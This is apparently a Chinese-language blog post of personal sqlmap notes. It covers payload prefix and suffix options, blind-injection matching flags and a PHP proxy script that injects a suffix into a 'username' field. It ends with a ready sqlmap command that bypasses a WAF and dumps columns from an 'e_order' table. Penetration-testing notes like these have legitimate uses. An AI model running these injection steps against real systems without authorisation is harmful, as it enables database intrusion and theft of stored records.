Title: Sqlmap备忘录
Date: 2017-1-3
Category: SQL
slug: sql-proxy


2017-1-11更新：
原来的时候下面这一坨代码用了半个小时写出来，PHP比较渣，变查边写边用burp调试。

其实需求很简单，就是在sqlmap的每个payload后面写入特定字符，昨天的时候看到这篇文章才发现sqlmap已经有选项了，感觉自己蠢蠢嗒- -

<http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html>

>The prefix (--prefix) and suffix (--suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. 

```
--prefix --suffix 是每次添加在payload的数据，一个前置，一个后置
```

###在注入测试的时候union查询用的是NULL?
> Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.

###使用具体的payload
如果知道了注入点是在order by，可以添加这样的选项:`--test-filter='ORDER BY'`

###`--string` & `--not-string`
Blind injection的时候，有这样的选项：

```
--string
--not-string
在true或者false要判断的字符

--regexp 使用的正则表达
--code 根据HTTP状态来判断
--text-only 比较回应的文本
--title 比较回应的title

其中作者说明了使用--string或者--not-string的时候可以使用Python里面的十六进制换行来匹配比如newline(\x0a)和tabs(\x09)

--string="Name\x0a\x09\x09Stephen"
```

###自动选择Y
注入的时候sqlmap会询问是Y或者N之类的，有这么一个选择可以：

`--answers='optimize=Y'`

另外一个是`--flush-session`刷新注入的session

最后一段是作者的经验，往往这个最重要，OK。下一集作者会写几个例子，关注下。

---
---
不晓得能不能成，就记录东西啦，不管是菜刀还是sqlmap，走的流量都是http协议，
最后判断的依据都是http页面上的内容。


```
<?php
set_time_limit(0);
$host = "";
$useragent="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";

$data=$_POST;
$u = $_POST["username"];
$u = $u." # between";
$re = array("username" => $u);
$pack = array_replace($data,$re);
$ch = curl_init();

curl_setopt($ch,CURLOPT_URL,$host);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_POST, 1);
curl_setopt($ch,CURLOPT_POSTFIELDS, $pack);
curl_setopt($ch,CURLOPT_TIMEOUT, 25);
curl_setopt($ch,CURLOPT_USERAGENT, $useragent);
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
	'Accept-Language: zh-cn',
	'Connection: Keep-Alive',
	"referer: $host"));
$return = curl_exec($ch);
echo $return;
?>

```

=====


```
可以先--count下看看总的数据量，然后再查看特定的内容
sqlmap -r ~/Desktop/11.txt -v 5 --technique E  --delay 3 --proxy=http://127.0.0.1:8080  --dbms=MySql  --dbs --skip-waf --dump -T e_order -C id,bid,uid --start <> --stop <>

```

--force-ssl 强制https，在使用`-r`选项的时候非常有用